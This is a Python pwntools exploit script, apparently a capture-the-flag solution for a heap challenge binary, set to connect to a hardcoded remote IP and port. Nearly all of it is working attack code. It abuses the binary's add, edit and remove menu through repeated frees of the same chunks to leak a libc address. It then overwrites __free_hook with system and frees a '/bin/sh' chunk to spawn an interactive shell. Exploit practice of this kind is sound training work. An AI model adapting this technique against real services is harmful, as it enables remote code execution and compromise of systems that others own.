# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './pwn'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = '123.56.85.29'
port = '4807'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)


def add(name, sex, information):
    sla(": \n", "1")
    sea("name\n", name)
    sea("sex\n", sex)
    sea("information\n", information)


def show(idx):
    sla(": \n", "2")
    sla(": \n", str(idx))


def edit(idx, sex, information):
    sla(": \n", "3")
    sla(": \n", str(idx))
    sea("sex?\n", sex)
    sea("information\n", information)


def remove(idx):
    sla(": \n", "4")
    sla(": \n", str(idx))


add("1" * 8, 'w', 'a' * 0x70)
add("1" * 8, 'w', 'a' * 0x70)
add("1" * 8, 'w', 'a' * 0x70)
add("1" * 8, 'w', 'a' * 0x70)
# add("1" * 8, 'w', 'a' * 0x70)
# add("1" * 8, 'w', 'a' * 0x70)
# add("1" * 8, 'w', 'a' * 0x70)

remove(0)
edit(0, 'Y', 'b' * 0x70)
remove(2)

remove(1)
edit(1, 'Y', 'b' * 0x70)
remove(1)
remove(0)

remove(3)
edit(3, 'Y', 'b' * 0x70)
remove(3)

edit(2, 'Y', 'b' * 0x70)
remove(2)

# remove(3)
show(2)
s = p.recvuntil('\x0a')
print hexdump(s)
libc.address = u64(s[0:6] + '\x00\x00') - 0x1e4ca0
success(hex(libc.address))
add(p64(libc.symbols['__free_hook'] - 0x10), 'w', 'a' * 0x70)
add('/bin/sh\x00', 'w', 'a' * 0x70)
add('/bin/sh\x00', 'w', p64(libc.symbols['system']).ljust(0x70, '\x00'))
remove(6)
shell()